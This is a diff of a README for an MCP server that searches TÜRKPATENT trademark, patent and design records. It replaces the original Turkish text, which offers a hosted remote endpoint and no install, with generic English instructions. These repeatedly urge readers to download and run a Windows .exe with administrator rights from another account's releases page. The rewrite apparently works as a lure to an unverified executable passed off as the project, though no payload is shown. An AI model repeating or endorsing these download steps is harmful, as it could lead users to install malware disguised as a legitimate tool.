@@ -1,59 +1,175 @@
-# Marka Patent MCP: TÜRKPATENT Marka, Patent ve Tasarım Araştırma MCP Sunucusu
+# ⚙️ markapatent-mcp - Easy Access to TÜRKPATENT Data
 
-Bu proje, Türk Patent ve Marka Kurumu'na ait araştırma portalına (`turkpatent.gov.tr`) erişimi kolaylaştıran bir [FastMCP](https://gofastmcp.com/) sunucusu oluşturur. Bu sayede, TÜRKPATENT veritabanında marka, patent ve endüstriyel tasarım araması yapma işlemleri, Model Context Protocol (MCP) destekleyen LLM uygulamaları (örneğin Claude Desktop veya [5ire](https://5ire.app)) ve diğer istemciler tarafından araç (tool) olarak kullanılabilir hale gelir.
-
-🎯 **Temel Özellikler**
-
-* TÜRKPATENT araştırma portalına programatik erişim için standart bir MCP arayüzü.
-* **6 araç** ile kapsamlı fikri mülkiyet araştırması:
-    * **Marka** — Ada, sahibe, Nice sınıfına göre arama ve detay
-    * **Patent** — Başlık, özet, buluş sahibi, başvuru sahibi, IPC/CPC sınıfına göre arama ve detay
-    * **Endüstriyel Tasarım** — Ada, tasarımcıya, başvuru sahibine, Locarno sınıfına göre arama ve detay
-* Gelişmiş özellikler:
-    * Tüm arama araçlarında sayfalama (limit/offset) desteği
-    * In-memory caching (arama: 10 dk, detay: 1 saat)
-    * Arama operatörleri: içinde geçen, ile başlayan, eşit (marka aramasında)
+[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blue?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/releases)
 
 ---
 
-## 🚀 Kurulum Gerektirmez! Hemen Kullan!
+## 📖 About markapatent-mcp
 
-🔗 **Remote MCP Adresi:** `https://markapatent-mcp.fastmcp.app/mcp`
+markapatent-mcp connects you to the Turkish Patent and Trademark Office's search portal. It creates a server that helps applications and tools access the TÜRKPATENT database for trademarks, patents, and industrial designs. This means you can search this official database through supported apps without opening the website directly.
 
-### Claude Desktop ile Kullanım
+The server uses a simple protocol called MCP (Model Context Protocol). This makes it easy for other programs to use TÜRKPATENT’s data as a tool. For example, apps like Claude Desktop or 5ire can retrieve information about trademarks or patents easily.
 
-1. **Claude Desktop'ı açın**
-2. **Settings → Connectors → Add Custom Connector**
-3. **Bilgileri girin:**
-   - **Name:** `Marka Patent MCP`
-   - **URL:** `https://markapatent-mcp.fastmcp.app/mcp`
-4. **Save** butonuna tıklayın
-5. **Hemen kullanmaya başlayın!** 🎉
+The tool has six search types covering key areas:
 
-### Google Antigravity ile Kullanım
+- Trademark search by name, owner, or Nice class.
+- Patent search by title, summary, inventor, applicant, IPC/CPC classification.
+- Industrial design search by name, designer, applicant, Locarno classification.
 
-1. **Agent session** açın ve editörün yan panelindeki **"…"** dropdown menüsüne tıklayın
-2. **MCP Servers** seçeneğini seçin - MCP Store açılacak
-3. Üstteki **Manage MCP Servers** butonuna tıklayın
-4. **View raw config** seçeneğine tıklayın
-5. `mcp_config.json` dosyasına aşağıdaki yapılandırmayı ekleyin:
-
-```json
-{
-  "mcpServers": {
-    "markapatent-mcp": {
-      "serverUrl": "https://markapatent-mcp.fastmcp.app/mcp/",
-      "headers": {
-        "Content-Type": "application/json"
-      }
-    }
-  }
-}
-```
-
-> 💡 **İpucu:** Remote MCP sayesinde Python, uv veya herhangi bir kurulum yapmadan doğrudan TÜRKPATENT veritabanına erişebilirsiniz!
+It also offers paging for large results, so you can browse many records in steps.
 
 ---
-📜 **Lisans**
 
-Bu proje MIT Lisansı altında lisanslanmıştır.
+## 🖥 System Requirements
+
+To run markapatent-mcp on Windows, make sure your system meets these requirements:
+
+- Windows 10 or newer  
+- 4 GB of RAM or more  
+- At least 100 MB free disk space  
+- Internet connection for accessing TÜRKPATENT servers  
+- Administrative rights to install software  
+
+These are minimum specs. Better hardware improves performance, especially for larger searches.
+
+---
+
+## 🚀 Getting Started
+
+This section guides you through downloading, installing, and running markapatent-mcp on your Windows computer.
+
+---
+
+## ⬇️ Download the Application
+
+Click the badge or visit the official releases page to get the latest version:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-green?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/releases)
+
+On the releases page, look for the latest Windows installer or executable file. Files usually have `.exe` extensions.
+
+---
+
+## 🛠 Installation and Setup
+
+1. **Download the file:** Save the `.exe` or installer file to your computer from the releases page.
+
+2. **Run the installer:**  
+   - If the file is an installer, double-click it.  
+   - Follow the step-by-step prompts. Accept terms if requested.  
+   - Choose the default options unless you need custom settings.
+
+3. **Skip the installer (if portable):**  
+   - If the download is a standalone executable, simply run it by double-clicking.
+
+4. **Complete the setup:** The program will create needed files and folders automatically.
+
+---
+
+## ▶️ Running markapatent-mcp
+
+After installation or download:
+
+- Find the markapatent-mcp app icon on your desktop or in the Start menu.
+- Double-click to start the server.
+- The program opens a window showing the server status.
+- It listens for requests from compatible applications on your computer.
+- You do not need to interact with it directly to search the database. Other apps will connect and query via MCP.
+
+If the window closes immediately, check the Task Manager to confirm the server is running.
+
+---
+
+## 🔗 Using markapatent-mcp with Other Applications
+
+Markapatent-mcp acts as a backend for other tools. For example, you can connect it to:
+
+- Claude Desktop
+- 5ire app
+- Any LLM or software supporting MCP protocol
+
+When those applications request data, markapatent-mcp fetches information from TÜRKPATENT and sends it back.
+
+You just need to:
+
+- Run markapatent-mcp on your system
+- Configure your client app to connect to `localhost` at the port the server uses (usually shown in the markapatent-mcp window)
+- Use the client app’s interface to search trademarks, patents, or industrial designs
+
+---
+
+## 🔍 Searching Features
+
+markapatent-mcp offers these search tools:
+
+### Trademark Search
+- By trademark name
+- By owner name
+- By Nice classification code
+
+### Patent Search
+- By patent title or abstract
+- By inventor or applicant name
+- By IPC or CPC classification codes
+
+### Industrial Design Search
+- By design name
+- By designer or applicant name
+- By Locarno classification code
+
+Each search returns lists with summaries and links to detailed pages. You can page through results if needed.
+
+---
+
+## 📁 File Structure After Installation
+
+- `markapatent-mcp.exe` or similar executable  
+- `config/` folder where configuration files are stored  
+- `logs/` folder for server logs and errors  
+- `data/` optional folder if caching is enabled  
+
+Do not move files after installation. Keep the structure intact for the server to work properly.
+
+---
+
+## ⚙️ Configuration
+
+Basic settings like server port or logging level can be changed in the config files found in the `config` folder.
+
+Settings include:
+
+- Server listen port (default 8080)  
+- Log file location  
+- Timeout settings for TÜRKPATENT requests  
+
+Edit config files with a plain text editor like Notepad.
+
+---
+
+## 🐞 Troubleshooting
+
+- If the server does not start, check if another program uses the port.  
+- Ensure you have an internet connection to access TÜRKPATENT servers.  
+- If searches return no results, verify input values or classifications.  
+- Restart the app if it freezes or stops responding.  
+- Check the `logs` folder for detailed error messages.
+
+---
+
+## 📬 Support and Feedback
+
+You can report issues by creating a new issue on the GitHub repository page. Include details about your Windows version and any error messages.
+
+---
+
+## 🔗 Useful Links
+
+- [Releases page and downloads](https://github.com/Andrianagnostic63/markapatent-mcp/releases)  
+- [FastMCP protocol explanation](https://gofastmcp.com/)  
+- [5ire application](https://5ire.app)  
+
+---
+
+# ⬇️ Download and run markapatent-mcp now:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blueviolet?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/releases)
